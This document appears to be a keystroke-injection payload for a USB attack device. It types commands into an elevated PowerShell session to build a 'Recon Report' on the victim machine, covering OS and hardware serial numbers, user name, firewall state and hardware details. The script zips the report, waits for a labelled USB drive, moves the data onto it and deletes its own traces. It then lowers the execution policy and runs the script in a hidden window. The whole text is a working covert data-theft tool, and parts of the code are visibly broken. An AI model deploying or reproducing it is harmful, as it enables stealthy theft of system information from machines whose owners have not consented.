delay(200)
press("GUI r")
delay(1000)
type("powershell Start-Process notepad -Verb runAs")
press("ENTER")
delay(200)
delay(200)
press("ENTER")
delay(1000)
type("m")
delay(1000)
press("DOWN")
press("ENTER")
type("$folderDateTime = (get-date).ToString('d-M-y HHmmss')")
press("ENTER")
type("$userDir = (Get-ChildItem env:\userprofile).value + '\Ducky Report ' + $folderDateTime")
press("ENTER")
type("$fileSaveDir = New-Item  ($userDir) -ItemType Directory ")
press("ENTER")
type("$date = get-date ")
press("ENTER")
type("$style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"")
press("ENTER")
type("$Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html' ")
press("ENTER")
type("$Report = $Report + "<div id=body><h1>Duck Tool Kit Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>" ")
press("ENTER")
type("$SysBootTime = Get-WmiObject Win32_OperatingSystem  ")
type("$BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)| ConvertTo-Html datetime  ")
type("$SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME)  ")
type("$SerialNo = $SysSerialNo.SerialNumber  ")
type("$SysInfo = Get-WmiObject -class Win32_ComputerSystem -namespace root/CIMV2 | Select Manufacturer,Model  ")
type("$SysManufacturer = $SysInfo.Manufacturer  ")
type("$SysModel = $SysInfo.Model")
type("$OS = (Get-WmiObject Win32_OperatingSystem -computername $env:COMPUTERNAME ).caption ")
type("$disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"")
press("ENTER")
type("$HD = [math]::truncate($disk.Size / 1GB) ")
press("ENTER")
type("$FreeSpace = [math]::truncate($disk.FreeSpace / 1GB) ")
press("ENTER")
type("$SysRam = Get-WmiObject -Class Win32_OperatingSystem -computername $env:COMPUTERNAME | Select  TotalVisibleMemorySize ")
type("$Ram = [Math]::Round($SysRam.TotalVisibleMemorySize/1024KB) ")
type("$SysCpu = Get-WmiObject Win32_Processor | Select Name ")
type("$Cpu = $SysCpu.Name ")
type("$HardSerial = Get-WMIObject Win32_BIOS -Computer $env:COMPUTERNAME | select SerialNumber ")
type("$HardSerialNo = $HardSerial.SerialNumber ")
type("$SysCdDrive = Get-WmiObject Win32_CDROMDrive |select Name ")
type("$graphicsCard = gwmi win32_VideoController |select Name ")
press("ENTER")
type("$graphics = $graphicsCard.Name ")
press("ENTER")
type("$SysCdDrive = Get-WmiObject Win32_CDROMDrive |select -first 1 ")
press("ENTER")
type("$DriveLetter = $CDDrive.Drive ")
type("$DriveName = $CDDrive.Caption ")
press("ENTER")
type("$Disk = $DriveLetter + '\' + $DriveName ")
press("ENTER")
type("$Firewall = New-Object -com HNetCfg.FwMgr  ")
type("$FireProfile = $Firewall.LocalPolicy.CurrentProfile  ")
press("ENTER")
type("$FireProfile = $FireProfile.FirewallEnabled")
type("$Report = $Report  + "<div id=left><h3>Computer Information</h3><br><table><tr><td>Operating System</td><td>$OS</td></tr><tr><td>OS Serial Number:</td><td>$SerialNo</td></tr><tr><td>Current User:</td><td>$env:USERNAME </td></tr><tr><td>System Uptime:</td><td>$BootTime</td></tr><tr><td>System Manufacturer:</td><td>$SysManufacturer</td></tr><tr><td>System Model:</td><td>$SysModel</td></tr><tr><td>Serial Number:</td><td>$HardSerialNo</td></tr><tr><td>Firewall is Active:</td><td>$FireProfile</td></tr></table></div><div id=right><h3>Hardware Information</h3><table><tr><td>Hardrive Size:</td><td>$HD GB</td></tr><tr><td>Hardrive Free Space:</td><td>$FreeSpace GB</td></tr><tr><td>System RAM:</td><td>$Ram GB</td></tr><tr><td>Processor:</td><td>$Cpu</td></tr><td>CD Drive:</td><td>$Disk</td></tr><tr><td>Graphics Card:</td><td>$graphics</td></tr></table></div>"  ")
type("$Report >> $fileSaveDir'/ComputerInfo.html' ")
press("ENTER")
type("function copy-ToZip($fileSaveDir){ ")
type("$srcdir = $fileSaveDir ")
press("ENTER")
type("$zipFile = 'C:\Windows\Report.zip'")
press("ENTER")
type("if(-not (test-path($zipFile))) { ")
press("ENTER")
type("set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))")
type("(dir $zipFile).IsReadOnly = $false} ")
press("ENTER")
type("$shellApplication = new-object -com shell.application ")
type("$zipPackage = $shellApplication.NameSpace($zipFile) ")
press("ENTER")
type("$files = Get-ChildItem -Path $srcdir ")
type("foreach($file in $files) { ")
press("ENTER")
type("$zipPackage.CopyHere($file.FullName) ")
type("while($zipPackage.Items().Item($file.name) -eq $null){ ")
press("ENTER")
type("Start-sleep -seconds 1 }}} ")
type("copy-ToZip($fileSaveDir) ")
press("ENTER")
type("$usbPresent = 'False' ")
type("do { ")
press("ENTER")
type("$present = Get-WMIObject Win32_Volume | ? { $_.Label -eq  'e:\-}' | Measure")
press("ENTER")
type("if ($present.Count -ge 1){ ")
type("$usbPresent = 'True' }Else { ")
press("ENTER")
type("$usbPresent = 'False'}} ")
type("until ($usbPresent -eq 'True') ")
press("ENTER")
type("$driveLetter = Get-WMIObject Win32_Volume | ? { $_.Label -eq  'e:\-}' | select Name")
press("ENTER")
type("move-item c:\Windows\Report.zip $driveLetter.Name")
press("ENTER")
type("remove-item $fileSaveDir -recurse ")
press("ENTER")
type("Remove-Item $MyINvocation.InvocationName ")
press("ENTER")
delay(200  )
type("C:\Windows\config-49312.ps1")
press("ENTER")
delay(1000)
delay(1000)
delay(200    )
type("powershell Start-Process cmd -Verb runAs")
press("ENTER")
delay(200  )
delay(200  )
type("mode con:cols=14 lines=1 ")
press("ENTER")
delay(200  )
type("m ")
delay(1000)
press("ENTER")
type("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false ")
delay(200  )
type("powershell.exe -windowstyle hidden -File C:\Windows\config-49312.ps1")
press("ENTER")
